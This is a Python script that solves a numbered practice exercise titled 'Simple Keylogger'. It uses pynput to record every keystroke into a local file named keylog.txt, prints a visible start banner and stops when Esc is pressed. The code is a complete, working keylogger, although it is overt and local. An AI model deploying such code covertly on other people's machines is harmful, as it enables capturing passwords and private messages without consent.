'''
6. Simple Keylogger

Write a basic keylogger that captures keystrokes and writes them to a file.

Task:

    Capture keystrokes from the keyboard.
    Write the captured keystrokes to a log file.

Hint: Use the pynput library to capture keystrokes.
'''

from pynput.keyboard import Key, Listener


log_file= "keylog.txt"

'''
def onPress(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.tab:
                f.write("\t")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key}]")
'''

def onPress(key):
    with open(log_file, "a+") as f:
        f.seek(0,2)
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.tab:
                f.write("\t")
            elif key == key.enter:
                f.write("\n")
            elif key == Key.backspace:
                f.seek(0,2)
                f.seek(f.tell() -1,0)
                f.truncate()
            elif key == Key.shift:
                print("")
            else:
                f.write(f"[{key}]")


def onRelease(key):
    if key == Key.esc:
        return False
print("=" * 150)
print("This KeyLogger is Made By Piyush Agarwal.")
print("=" * 150)

print('''[*] Starting Keylogger...
[*] You can press esc or ctrl+c to stop the keylogger...
[*] You can start Typing Now...''')
with Listener(on_press=onPress, on_release=onRelease) as listner:
    listner.join()